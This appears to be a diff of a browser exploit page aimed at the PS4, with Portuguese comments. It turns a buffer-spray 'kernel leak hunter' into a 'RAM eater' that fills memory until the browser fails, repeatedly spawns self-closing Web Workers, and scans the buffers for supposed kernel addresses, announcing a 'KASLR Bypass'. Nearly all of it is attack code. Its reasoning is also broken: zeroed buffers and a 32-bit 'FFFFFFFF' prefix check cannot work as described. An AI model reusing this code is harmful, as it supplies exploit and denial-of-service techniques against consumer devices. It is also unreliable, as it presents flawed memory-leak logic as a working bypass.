@@ -2,90 +2,133 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Kernel Leak Hunter</title>
+    <title>PS4 RAM Eater & Leak Hunter</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; }
-        .found { color: #ff00ff; font-weight: bold; border: 1px solid #ff00ff; padding: 10px; }
-        .log { border-bottom: 1px solid #333; }
+        body { background: #000; color: #0f0; font-family: monospace; font-size: 12px; }
+        #status { font-weight: bold; color: yellow; margin-bottom: 10px; }
+        .found { background: #ff00ff; color: #fff; font-size: 16px; border: 2px solid #fff; padding: 5px; }
+        .bar { width: 100%; height: 20px; background: #333; margin-top: 5px; }
+        .progress { width: 0%; height: 100%; background: #0f0; }
     </style>
 </head>
 <body>
-    <h3>KERNEL MEMORY LEAK HUNTER</h3>
-    <p>Tentando sobrepor a estrutura da Thread com ArrayBuffers...</p>
-    <button onclick="startHunting()">INICIAR CAÇADA</button>
+    <h3>ESTRATÉGIA: HEAP EXHAUSTION (PREENCHIMENTO TOTAL)</h3>
+    <div id="status">Status: Aguardando início...</div>
+    <div class="bar"><div id="prog" class="progress"></div></div>
+    
+    <br>
+    <button onclick="startRamEater()">INICIAR VARREDURA TOTAL</button>
     <div id="console"></div>
 
     <script>
+        var logElem = document.getElementById('console');
         function log(msg, type="") {
             var d = document.createElement('div');
-            d.className = 'log ' + type;
+            d.className = type;
             d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            document.getElementById('console').appendChild(d);
+            logElem.appendChild(d);
         }
 
-        // O alvo: ArrayBuffers onde esperamos que o Kernel escreva
-        var targets = [];
-        const SPRAY_SIZE = 2000; 
+        // Armazena todos os blocos de memória para não deixar o GC limpar
+        var allMemory = [];
+        var totalAllocated = 0;
+        
+        // Tamanho de cada bloco (1MB para ser rápido)
+        const BLOCK_SIZE = 1024 * 1024; 
+        const VIEW_SIZE = BLOCK_SIZE / 4; // Int32View
 
-        function startHunting() {
-            log("Preparando armadilhas de memória (Buffers zerados)...");
-
-            // 1. Criar milhares de buffers vazios (Zeros)
-            // Tamanho 1024 (tamanho provável de struct de thread)
-            for(let i=0; i<SPRAY_SIZE; i++) {
-                targets[i] = new Uint32Array(1024 / 4); // 1024 bytes
+        // O Worker que causa a corrupção
+        var workerBlob = new Blob([`
+            self.onmessage = function() {
+                // Tenta corromper a memória ao fechar
+                self.close();
             }
+        `], {type: 'application/javascript'});
+        var workerUrl = URL.createObjectURL(workerBlob);
 
-            log("Disparando Race Condition (Thread TCB)...");
-            
-            // 2. O Worker Explosivo
-            const blob = new Blob([`
-                self.onmessage = function(e) {
-                    // Tenta alocar/desalocar rápido e morrer
-                    let d = new Date();
-                    self.close();
-                }
-            `], {type: 'application/javascript'});
-            const url = URL.createObjectURL(blob);
+        async function startRamEater() {
+            document.getElementById('status').innerText = "Status: ENCHENDO MEMÓRIA...";
+            log("Iniciando alocação sequencial...", "info");
 
-            // 3. Loop de Tentativas
-            let attempts = 0;
-            let iv = setInterval(() => {
-                attempts++;
+            // Tenta alocar até explodir (OOM)
+            let step = 0;
+            let maxSteps = 2000; // Tenta alocar até ~2GB (limite do navegador)
+
+            let interval = setInterval(() => {
+                step++;
                 
-                // Cria e mata threads para agitar o Kernel Heap
-                for(let k=0; k<10; k++) {
-                    let w = new Worker(url);
-                    w.postMessage("go");
+                try {
+                    // 1. ALOCAÇÃO (O Pulo para a próxima gaveta livre)
+                    let buffer = new ArrayBuffer(BLOCK_SIZE);
+                    let view = new Uint32Array(buffer);
+                    
+                    // Preenche com zeros para termos certeza
+                    // (O navegador já faz isso, mas garante que a página de memória é 'tocada')
+                    view[0] = 0; 
+                    
+                    // Guarda na nossa lista global
+                    allMemory.push(view);
+                    totalAllocated += 1;
+
+                    // Atualiza visual
+                    let pct = (step / maxSteps) * 100;
+                    document.getElementById('prog').style.width = pct + "%";
+                    document.getElementById('status').innerText = `RAM: ${totalAllocated} MB alocados`;
+
+                    // 2. O GATILHO (Tenta corromper o bloco atual ou vizinhos)
+                    // Disparamos o worker para ver se ele usa a memória que acabamos de pegar
+                    // ou a memória vizinha que vamos pegar no próximo passo.
+                    let w = new Worker(workerUrl);
+                    w.postMessage("die");
+
+                    // 3. A VERIFICAÇÃO (Scan)
+                    // A cada 50MB alocados, verificamos TUDO para trás
+                    if (step % 50 === 0) {
+                        checkAllMemory();
+                    }
+
+                } catch(e) {
+                    // Se der erro de memória (OOM), paramos e fazemos uma varredura final
+                    clearInterval(interval);
+                    log("LIMITE DE MEMÓRIA ATINGIDO! OOM.", "warn");
+                    log("Fazendo varredura final em toda a RAM alocada...", "info");
+                    checkAllMemory();
+                    document.getElementById('status').innerText = "Status: CHEIO (Scan Final)";
                 }
 
-                // 4. A VERIFICAÇÃO (O "DUMP")
-                // Checamos se algum dos nossos buffers deixou de ser zero
-                checkMemory();
-
-                if(attempts % 50 === 0) log(`Ciclo ${attempts}: Nada encontrado ainda...`);
-                
-                // Segurança para não travar o browser totalmente
-                if(attempts > 500) {
-                    clearInterval(iv);
-                    log("Fim das tentativas. Tente recarregar.");
-                }
-            }, 20);
+            }, 5); // Tenta alocar um bloco a cada 5ms
         }
 
-        function checkMemory() {
-            // Varre nossos buffers procurando "Ouro"
-            for(let i=0; i < SPRAY_SIZE; i++) {
-                let arr = targets[i];
-                // Checa apenas o início e fim para ser rápido
-                if (arr[0] !== 0 || arr[1] !== 0 || arr[10] !== 0) {
-                    
-                    // ACHAMOS ALGO!
-                    log(`[!!!] LEAK ENCONTRADO NO BUFFER ${i}!`, "found");
-                    log(`Dados: 0x${arr[0].toString(16)} 0x${arr[1].toString(16)}...`, "found");
-                    
-                    // Se acharmos, paramos tudo para analisar
-                    throw "LEAK FOUND"; 
+        function checkAllMemory() {
+            // Varre todos os blocos que já alocamos
+            // Isso pode ser lento, mas é necessário
+            for(let i = allMemory.length - 1; i >= 0; i--) {
+                let view = allMemory[i];
+                
+                // Checamos apenas o início de cada página de 1KB dentro do bloco de 1MB
+                // Otimização para não travar o loop
+                for(let k = 0; k < view.length; k += 256) { // Pula de 1kb em 1kb
+                    if (view[k] !== 0) {
+                        foundLeak(i, k, view[k]);
+                        return;
+                    }
+                }
+            }
+        }
+
+        function foundLeak(blockIndex, offset, value) {
+            let hex = "0x" + (value >>> 0).toString(16).toUpperCase();
+            
+            // Filtra ruído (0x0, números pequenos)
+            if (value > 0x100000) {
+                log(`[!!!] LEAK CONFIRMADO! Bloco ${blockIndex} Offset ${offset}`, "found");
+                log(`VALOR: ${hex}`, "found");
+                
+                if (hex.startsWith("0xFFFFFFFF")) {
+                    log("Isso parece um endereço de Kernel! (KASLR Bypass)", "found");
+                    document.getElementById('status').innerText = "Status: PWNED (Leak Achado)";
+                    // Congela tudo para preservar o leak
+                    throw "STOP"; 
                 }
             }
         }
